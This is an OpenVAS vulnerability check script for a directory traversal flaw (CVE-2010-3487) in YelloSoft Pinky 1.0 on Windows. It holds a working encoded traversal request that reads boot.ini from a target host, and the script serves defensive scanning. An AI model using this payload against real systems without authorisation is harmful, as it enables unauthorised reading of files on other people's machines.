###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_yellosoft_pinky_dir_trav_vuln_win.nasl 8207 2017-12-21 07:30:12Z teissa $
#
# YelloSoft Pinky Directory Traversal Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attacker to gain information
about directory and file locations.

Impact Level: System/Application.";

tag_affected = "Yellosoft pinky version 1.0 and prior on windows.";

tag_insight = "Input passed via the URL is not properly verified before being
 used to read files. This can be exploited to download arbitrary files via
directory traversal attacks.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running YelloSoft Pinky and is prone to Directory
Traversal vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902253");
  script_version("$Revision: 8207 $");
  script_tag(name:"last_modification", value:"$Date: 2017-12-21 08:30:12 +0100 (Thu, 21 Dec 2017) $");
  script_tag(name:"creation_date", value:"2010-09-29 09:26:02 +0200 (Wed, 29 Sep 2010)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2010-3487");
  script_name("YelloSoft Pinky Directory Traversal Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/41538");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/1009-exploits/pinky10-traversal.txt");
  script_xref(name : "URL" , value : "http://www.johnleitch.net/Vulnerabilities/Pinky.1.0.Directory.Traversal/42");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 SecPod");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 2323);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"qod_type", value:"registry");
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

ysPort = get_http_port( default:2323 );

rcvRes = http_get_cache(item:string("/index.html"), port:ysPort);

## Confirm the application
if("<title>Pinky</title" >< rcvRes && ">YelloSoft<" >< rcvRes)
{
  ## Construct the attack string
  request = http_get(item:"/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C.." +
                          "/%5C../%5C../boot.ini", port:ysPort);
  response = http_keepalive_send_recv(port:ysPort, data:request);

  ## Confirm the working Exploit for windows
  if(("\WINDOWS" >< response) && ("boot loader" >< response)){
      security_message(ysPort);
  }
}
